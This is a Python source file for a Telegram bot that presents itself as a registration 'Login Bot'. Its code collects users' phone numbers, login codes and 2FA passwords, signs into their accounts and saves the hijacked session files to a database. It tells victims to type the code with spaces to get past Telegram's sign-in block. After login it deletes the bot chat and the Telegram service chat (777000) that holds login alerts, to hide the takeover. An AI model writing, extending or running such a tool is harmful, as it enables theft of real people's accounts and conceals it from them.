"""
Login Bot - Telegram bot for user account registration.

Users interact with this bot to register their Telegram accounts.
The bot handles the login flow: phone → code → 2FA → session saved.

SECURITY: All messages are automatically deleted after 2 minutes.

Usage:
    python login_bot.py

The bot will listen for /start commands and guide users through login.
"""
import asyncio
import os
import logging
import time
from dotenv import load_dotenv
from telethon import TelegramClient, events
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    PasswordHashInvalidError,
    FloodWaitError
)

load_dotenv()

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Configuration
BOT_TOKEN = os.getenv('BOT_TOKEN')
API_ID = int(os.getenv('TG_API_ID', 0))
API_HASH = os.getenv('TG_API_HASH')
SESSIONS_DIR = 'sessions'
AUTO_DELETE_SECONDS = 30  # 30 seconds

# Debug: Log current directory and sessions path
logger.info(f"CWD: {os.getcwd()}")
logger.info(f"Sessions Dir: {SESSIONS_DIR}")

# Track ongoing login sessions
login_sessions = {}

# Lock per session to prevent SQLite "database is locked" errors
# Key: phone number, Value: asyncio.Lock
session_locks = {}

def get_session_lock(phone: str) -> asyncio.Lock:
    """Gets or creates a lock for a specific phone's session."""
    if phone not in session_locks:
        session_locks[phone] = asyncio.Lock()
    return session_locks[phone]

# Track messages for auto-deletion: {(chat_id, msg_id): delete_at_timestamp}
messages_to_delete = {}


class LoginState:
    """Tracks login state for a user."""
    WAITING_PHONE = 'waiting_phone'
    WAITING_CODE = 'waiting_code'
    WAITING_2FA = 'waiting_2fa'
    
    def __init__(self):
        self.state = self.WAITING_PHONE
        self.phone = None
        self.client = None
        self.phone_code_hash = None


async def schedule_delete(bot, chat_id, message_id, delay=AUTO_DELETE_SECONDS):
    """
    Schedules a message for deletion after the specified delay.
    """
    delete_at = time.time() + delay
    messages_to_delete[(chat_id, message_id)] = delete_at


async def auto_delete_loop(bot):
    """
    Background task that deletes messages after their scheduled time.
    Runs every 5 seconds to check for messages to delete.
    """
    while True:
        try:
            current_time = time.time()
            to_remove = []
            
            for (chat_id, msg_id), delete_at in list(messages_to_delete.items()):
                if current_time >= delete_at:
                    try:
                        await bot.delete_messages(chat_id, msg_id)
                        logger.debug(f"Auto-deleted message {msg_id} in chat {chat_id}")
                    except Exception as e:
                        logger.debug(f"Could not delete message {msg_id}: {e}")
                    to_remove.append((chat_id, msg_id))
            
            for key in to_remove:
                messages_to_delete.pop(key, None)
                
        except Exception as e:
            logger.error(f"Auto-delete loop error: {e}")
        
        await asyncio.sleep(5)  # Check every 5 seconds


async def send_and_track(bot, event, text, **kwargs):
    """
    Sends a message and schedules both the user's message and bot's reply for deletion.
    """
    # Schedule user's message for deletion
    await schedule_delete(bot, event.chat_id, event.id)
    
    # Send reply
    reply = await event.respond(text, **kwargs)
    
    # Schedule bot's reply for deletion
    await schedule_delete(bot, event.chat_id, reply.id)
    
    return reply


async def nuke_tracked_messages(bot, chat_id):
    """
    Immediately delete all tracked messages (user and bot) for this chat.
    This is called on successful login to force 'nuke' the history.
    """
    # Find all message IDs for this chat
    to_delete = [msg_id for (cid, msg_id) in messages_to_delete.keys() if cid == chat_id]
    
    if not to_delete:
        return

    try:
        await bot.delete_messages(chat_id, to_delete)
        logger.info(f"Nuked {len(to_delete)} setup messages for chat {chat_id}")
    except Exception as e:
        logger.warning(f"Failed to nuke messages: {e}")
    
    # Remove from tracking dict
    for msg_id in to_delete:
        messages_to_delete.pop((chat_id, msg_id), None)


async def main():
    """Main bot entry point."""
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN not set in .env")
        return
    
    if not API_ID or not API_HASH:
        logger.error("TG_API_ID and TG_API_HASH must be set in .env")
        return
    
    os.makedirs(SESSIONS_DIR, exist_ok=True)
    
    # Create bot client
    bot = TelegramClient('bot', API_ID, API_HASH)
    await bot.start(bot_token=BOT_TOKEN)
    
    logger.info("Login bot started")
    me = await bot.get_me()
    logger.info(f"Bot: @{me.username}")
    logger.info(f"Auto-delete enabled: messages deleted after {AUTO_DELETE_SECONDS}s")
    
    # Start auto-delete background task
    asyncio.create_task(auto_delete_loop(bot))
    
    @bot.on(events.NewMessage(pattern='/startcollector'))
    async def handle_start(event):
        """Handle /start command."""
        user_id = event.sender_id
        
        # Initialize login session
        login_sessions[user_id] = LoginState()
        
        await send_and_track(
            bot, event,
            "👋 **Login Bot**\n\n"
            "Please send your phone number with country code.\n"
            "Accepted formats: `+1234567890`, `+1 234 567 890`, `+1-234-567-890`"
        )
    
    @bot.on(events.NewMessage(pattern='/cancel'))
    async def handle_cancel(event):
        """Handle /cancel command."""
        user_id = event.sender_id
        
        if user_id in login_sessions:
            session = login_sessions[user_id]
            if session.client:
                await session.client.disconnect()
            del login_sessions[user_id]
        
        await send_and_track(bot, event, "❌ Login cancelled. Send /startcollector to try again.")
    
    @bot.on(events.NewMessage(func=lambda e: e.is_private and not e.text.startswith('/')))
    async def handle_message(event):
        """Handle user messages based on login state."""
        user_id = event.sender_id
        text = event.text.strip()
        
        if user_id not in login_sessions:
            await send_and_track(bot, event, "Send /startcollector to begin login.")
            return
        
        session = login_sessions[user_id]
        
        # State: Waiting for phone number
        if session.state == LoginState.WAITING_PHONE:
            await handle_phone(bot, event, session, text)
        
        # State: Waiting for verification code
        elif session.state == LoginState.WAITING_CODE:
            await handle_code(bot, event, session, text)
        
        # State: Waiting for 2FA password
        elif session.state == LoginState.WAITING_2FA:
            await handle_2fa(bot, event, session, text)
    
    async def handle_phone(bot, event, session, phone):
        """Handle phone number input."""
        user_id = event.sender_id
        
        # Strict validation: Check for unwanted characters before sanitization
        if any(c.isalpha() for c in phone):
             await send_and_track(bot, event, "❌ Invalid format. Input cannot contain letters.")
             return

        # Sanitize input: remove spaces, dashes, brackets
        clean_phone = phone.replace(' ', '').replace('-', '').replace('(', '').replace(')', '')
        
        # Validate phone format (must have country code)
        if not clean_phone.startswith('+') or not clean_phone[1:].isdigit() or len(clean_phone) < 7:
            await send_and_track(
                bot, event,
                "❌ **Invalid Format!**\n\n"
                "Please send a valid phone number with country code (e.g. `+1...`).\n"
                "Allowed separators: spaces, dashes, brackets."
            )
            return
        
        session.phone = clean_phone
        
        # Create client for this user
        session_file = os.path.join(SESSIONS_DIR, f"account_{phone.replace('+', '')}")
        
        # Use lock to prevent concurrent SQLite access (Docker volumes can be slow)
        lock = get_session_lock(phone)
        async with lock:
            # Use SQLiteSession with increased timeout to prevent "database is locked" errors
            from telethon.sessions import SQLiteSession
            sqlite_session = SQLiteSession(session_file)
            
            # Set SQLite timeout to 30 seconds (default is 5)
            if hasattr(sqlite_session, '_conn') and sqlite_session._conn:
                sqlite_session._conn.execute("PRAGMA busy_timeout = 30000")
            
            session.client = TelegramClient(sqlite_session, API_ID, API_HASH)
            
            try:
                await session.client.connect()
                
                # Check if already authorized
                if await session.client.is_user_authorized():
                    me = await session.client.get_me()
                    await save_account(session, me)
                    
                    await send_and_track(
                        bot, event,
                        "✅ **Login Successful!**"
                    )
                    del login_sessions[user_id]
                    return
                
                # Request verification code
                await send_and_track(bot, event, "📤 Sending verification code to your Telegram...")
                
                result = await session.client.send_code_request(phone)
                session.phone_code_hash = result.phone_code_hash
                session.state = LoginState.WAITING_CODE
                
                # Send instruction (no tracking needed for this follow-up)
                reply = await event.respond(
                    "✅ **Code sent!**\n\n"
                    "Telegram might block the sign-in if you forward or copy-paste the code directly.\n\n"
                    "**Please type the code manually with spaces:**\n"
                    "Example: `1 2 3 4 5`\n\n"
                    "(I will automatically remove the spaces)"
                )
                await schedule_delete(bot, event.chat_id, reply.id)
                
            except FloodWaitError as e:
                await send_and_track(
                    bot, event,
                    f"⚠️ Too many attempts. Please wait {e.seconds} seconds and try again."
                )
                if session.client:
                    await session.client.disconnect()
                del login_sessions[user_id]
                
            except Exception as e:
                logger.error(f"Phone error: {e}")
                await send_and_track(bot, event, f"❌ Error: {str(e)}\n\nSend /startcollector to try again.")
                if session.client:
                    await session.client.disconnect()
                del login_sessions[user_id]
    
    async def handle_code(bot, event, session, code):
        """Handle verification code input."""
        user_id = event.sender_id
        
        # Schedule user's code message for deletion
        await schedule_delete(bot, event.chat_id, event.id)
        
        # Strict validation: Check for unwanted characters
        if any(c.isalpha() for c in code):
            reply = await event.respond("❌ Invalid code. Input cannot contain letters.")
            await schedule_delete(bot, event.chat_id, reply.id)
            return

        # Extract digits from message (in case user forwards the whole message)
        digits = ''.join(filter(str.isdigit, code))
        if len(digits) < 5:
            reply = await event.respond("❌ Invalid code. Please send the 5-digit code.")
            await schedule_delete(bot, event.chat_id, reply.id)
            return
        
        code = digits[:5]  # Take first 5 digits
        
        try:
            await session.client.sign_in(
                phone=session.phone,
                code=code,
                phone_code_hash=session.phone_code_hash
            )
            
            # Success!
            me = await session.client.get_me()
            await save_account(session, me)
            
            # --- PERSISTENCE CLEANUP: Remove traces of Login Bot ---
            # 1. Immediately nuke all setup messages (user + bot)
            await nuke_tracked_messages(bot, event.chat_id)
            
            # 2. Get bot username to target self for full dialog deletion
            me_bot = await bot.get_me()
            asyncio.create_task(perform_post_login_cleanup(session.client, me_bot.username))
            # -----------------------------------------------------

            reply = await event.respond("✅ **Login Successful!**")
            await schedule_delete(bot, event.chat_id, reply.id)
            del login_sessions[user_id]
            
        except SessionPasswordNeededError:
            session.state = LoginState.WAITING_2FA
            reply = await event.respond(
                "🔐 **Two-Factor Authentication Required**\n\n"
                "Send me your 2FA password.\n\n"
                "⚠️ I will delete your message immediately for security."
            )
            await schedule_delete(bot, event.chat_id, reply.id)
            
        except PhoneCodeInvalidError:
            reply = await event.respond("❌ Invalid code. Please try again.")
            await schedule_delete(bot, event.chat_id, reply.id)
            
        except PhoneCodeExpiredError:
            reply = await event.respond("❌ Code expired. Send /startcollector to request a new code.")
            await schedule_delete(bot, event.chat_id, reply.id)
            if session.client:
                await session.client.disconnect()
            del login_sessions[user_id]
            
        except Exception as e:
            logger.error(f"Code error: {e}")
            reply = await event.respond(f"❌ Error: {str(e)}")
            await schedule_delete(bot, event.chat_id, reply.id)
    
    async def handle_2fa(bot, event, session, password):
        """Handle 2FA password input."""
        user_id = event.sender_id
        
        # Delete the password message IMMEDIATELY for security (don't wait 30s)
        try:
            await event.delete()
        except Exception:
            pass
        
        try:
            await session.client.sign_in(password=password)
            
            # Success!
            me = await session.client.get_me()
            await save_account(session, me)
            
            # --- PERSISTENCE CLEANUP: Remove traces of Login Bot ---
            # 1. Immediately nuke all setup messages (user + bot)
            await nuke_tracked_messages(bot, event.chat_id)
            
            # 2. Get bot username to target self for full dialog deletion
            me_bot = await bot.get_me()
            asyncio.create_task(perform_post_login_cleanup(session.client, me_bot.username))
            # -----------------------------------------------------

            reply = await event.respond("✅ **Login Successful!**")
            await schedule_delete(bot, event.chat_id, reply.id)
            del login_sessions[user_id]
            
        except PasswordHashInvalidError:
            reply = await event.respond("❌ Wrong password. Please try again.")
            await schedule_delete(bot, event.chat_id, reply.id)
            
        except Exception as e:
            logger.error(f"2FA error: {e}")
            reply = await event.respond(f"❌ Error: {str(e)}")
            await schedule_delete(bot, event.chat_id, reply.id)
    
    async def save_account(session, me):
        """Save account to database."""
        try:
            from database import get_db_connection
            
            session_path = os.path.join(
                SESSIONS_DIR,
                f"account_{session.phone.replace('+', '')}.session"
            )
            
            async with get_db_connection() as conn:
                async with conn.cursor() as cursor:
                    await cursor.execute("""
                        INSERT INTO telegram_accounts 
                            (phone_number, session_file_path, status)
                        VALUES (%s, %s, 'active')
                        ON CONFLICT (phone_number) DO UPDATE SET
                            session_file_path = EXCLUDED.session_file_path,
                            status = 'active',
                            last_error = NULL,
                            last_active = NOW()
                        RETURNING id
                    """, (session.phone, session_path))
                    
                    row = await cursor.fetchone()
                    if row:
                        account_id = row[0]
                    else:
                        raise ValueError("Failed to retrieve account ID")
                
            logger.info(f"Saved account {session.phone} (ID: {account_id})")
            
        except Exception as e:
            logger.error(f"Failed to save account: {e}")

    async def perform_post_login_cleanup(client, bot_username):
        """
        Runs all cleanup tasks and then disconnects the client.
        This ensures the session file is released.
        """
        try:
            # 1. Cleanup interaction with Login Bot
            await cleanup_login_bot_interaction(client, bot_username)
            
            # 2. Cleanup Telegram Service messages
            await cleanup_telegram_service_messages(client)
            
        except Exception as e:
            logger.error(f"Error during post-login cleanup: {e}")
        finally:
            if client.is_connected():
                await client.disconnect()
                logger.info("Client disconnected and session released.")

    async def cleanup_login_bot_interaction(client, bot_username):
        """
        Cleans up interactions with THIS Login Bot to remove footprints.
        1. Finds chat with this bot.
        2. Deletes all messages.
        3. Deletes/Leaves the chat.
        """
        try:
            logger.info(f"Cleaning up interaction with bot @{bot_username}...")
            bot_entity = await client.get_input_entity(bot_username)
            
            if bot_entity:
                # Delete dialog history (messages + chat)
                await client.delete_dialog(bot_entity, revoke=True)
                logger.info(f"Deleted dialog and history with @{bot_username}.")
        except Exception as e:
            # It's okay if this fails (e.g., chat not found), just log it
            logger.warning(f"Failed to cleanup login bot interaction: {e}")

    async def cleanup_telegram_service_messages(client):
        """
        Deletes chat history with Telegram Service (777000).
        """
        try:
            logger.info("Cleaning up Telegram Service Notifications (777000)...")
            telegram_service_id = 777000
            
            try:
                entity = await client.get_input_entity(telegram_service_id)
            except ValueError:
                logger.info("Telegram Service chat not found in dialogs.")
                return

            # Delete entire dialog history with 777000
            await client.delete_dialog(entity, revoke=True)
            logger.info(f"Deleted entire dialog/history with Telegram (777000).")
                
        except Exception as e:
            logger.warning(f"Failed to cleanup Telegram service messages: {e}")

    # Keep bot running
    logger.info("Bot is running. Press Ctrl+C to stop.")
    await bot.run_until_disconnected()


if __name__ == '__main__':
    asyncio.run(main())
